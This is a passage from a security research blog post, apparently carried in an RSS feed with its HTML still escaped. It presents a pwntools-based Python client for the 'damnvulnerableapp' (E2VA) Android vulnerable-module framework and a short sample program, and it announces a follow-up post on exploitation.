&lt;p>In order to ease communication with the &lt;em>damnvulnerableapp&lt;/em> and therefore the vulnerable modules, a client emerged that wraps the most important functionalities required to interact with the modules. The client is based on &lt;a href="https://docs.pwntools.com/en/stable/">&lt;code>pwntools&lt;/code>&lt;/a>, but can easily be translated to work with plain &lt;a href="https://docs.python.org/3/library/socket.html">&lt;code>sockets&lt;/code>&lt;/a> aswell.&lt;/p>
&lt;p>The following is the implementation of the &lt;code>pwntools&lt;/code> - based client (no guarantees for correctness and completeness):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> typing &lt;span style="color:#f92672">import&lt;/span> Tuple
TIMEOUT &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>
&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">PwnClient&lt;/span>:
&lt;span style="color:#66d9ef">def&lt;/span> __init__(self, host : str, port : int):
self&lt;span style="color:#f92672">.&lt;/span>io &lt;span style="color:#f92672">=&lt;/span> remote(host, port)
self&lt;span style="color:#f92672">.&lt;/span>handshake()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">handshake&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>:
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;USER&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;INIT&amp;#39;&lt;/span>, capsule_type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;INIT&amp;#39;&lt;/span>)
self&lt;span style="color:#f92672">.&lt;/span>receive()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">close&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>:
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;SHUTDOWN&amp;#39;&lt;/span>)
self&lt;span style="color:#f92672">.&lt;/span>receive()
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, capsule_type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ACK&amp;#39;&lt;/span>)
self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>close()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">send&lt;/span>(self, message : bytes, operation, capsule_type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;CONTENT&amp;#39;&lt;/span>) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>:
capsule &lt;span style="color:#f92672">=&lt;/span> capsule_type &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> operation &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; CONTENT &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> message
length &lt;span style="color:#f92672">=&lt;/span> len(capsule)
self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>send(p32(length, endian&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;big&amp;#39;&lt;/span>))
self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>send(capsule)
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">block_receive&lt;/span>(self, num_bytes : int) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> bytes:
message &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> (len(message) &lt;span style="color:#f92672">&amp;lt;&lt;/span> num_bytes):
received &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">1&lt;/span>, timeout&lt;span style="color:#f92672">=&lt;/span>TIMEOUT)
&lt;span style="color:#66d9ef">if&lt;/span> (received &lt;span style="color:#f92672">and&lt;/span> len(received) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>):
message &lt;span style="color:#f92672">+=&lt;/span> received
&lt;span style="color:#66d9ef">return&lt;/span> message
&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#e6db74"> Returns:
&lt;/span>&lt;span style="color:#e6db74"> (length, capsule_type, operation, content)
&lt;/span>&lt;span style="color:#e6db74"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">receive&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> Tuple[int, bytes, bytes, bytes]:
length &lt;span style="color:#f92672">=&lt;/span> u32(self&lt;span style="color:#f92672">.&lt;/span>block_receive(&lt;span style="color:#ae81ff">4&lt;/span>), endian&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;big&amp;#39;&lt;/span>)
message &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>block_receive(length)
split_message &lt;span style="color:#f92672">=&lt;/span> message&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>)
operation &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> (len(split_message) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>):
operation &lt;span style="color:#f92672">=&lt;/span> split_message[&lt;span style="color:#ae81ff">1&lt;/span>]
content &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> (len(split_message) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>):
content &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(split_message[&lt;span style="color:#ae81ff">3&lt;/span>:])
&lt;span style="color:#66d9ef">return&lt;/span> (length, split_message[&lt;span style="color:#ae81ff">0&lt;/span>], operation, content)
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">select&lt;/span>(self, module_name : str) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> str:
self&lt;span style="color:#f92672">.&lt;/span>send(module_name&lt;span style="color:#f92672">.&lt;/span>encode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>), &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;SELECT&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>receive()[&lt;span style="color:#ae81ff">3&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">forward&lt;/span>(self, message : bytes) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> str:
self&lt;span style="color:#f92672">.&lt;/span>send(message, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;FORWARD&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>receive()[&lt;span style="color:#ae81ff">3&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">fetch&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> bytes:
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;FETCH&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>receive()[&lt;span style="color:#ae81ff">3&lt;/span>]
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">exit&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> str:
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;EXIT&amp;#39;&lt;/span>)
res &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>receive()[&lt;span style="color:#ae81ff">3&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode()
self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>close()
&lt;span style="color:#66d9ef">return&lt;/span> res
&lt;/code>&lt;/pre>&lt;/div>&lt;p>A sample program could look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">...&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
io &lt;span style="color:#f92672">=&lt;/span> PwnClient(&lt;span style="color:#e6db74">&amp;#39;127.0.0.1&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">8080&lt;/span>)
print(io&lt;span style="color:#f92672">.&lt;/span>fetch())
io&lt;span style="color:#f92672">.&lt;/span>forward(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;test123&amp;#39;&lt;/span>)
print(io&lt;span style="color:#f92672">.&lt;/span>fetch())
io&lt;span style="color:#f92672">.&lt;/span>exit()
&lt;span style="color:#66d9ef">if&lt;/span> (__name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>):
main()
&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>In this post, &lt;em>damnvulnerableapp&lt;/em> aka &lt;em>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA&lt;/em> was presented as an Android app that manages custom vulnerable modules that can be used for vulnerability research on Android OS&amp;rsquo;s. To that end, the modules try to cover different vulnerability classes to allow for discovery of Android - specific difficulities in binary exploitation.
In our next post we dive into the first vulnerability and how to exploit it. Stay tuned.&lt;/p>
&lt;h2 id="getting-started">Getting started&lt;/h2>
&lt;p>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA can be downloaded here: &lt;a href="https://github.com/fkie-cad/eeva">https://github.com/fkie-cad/eeva&lt;/a>&lt;/p></content></item></channel></rss>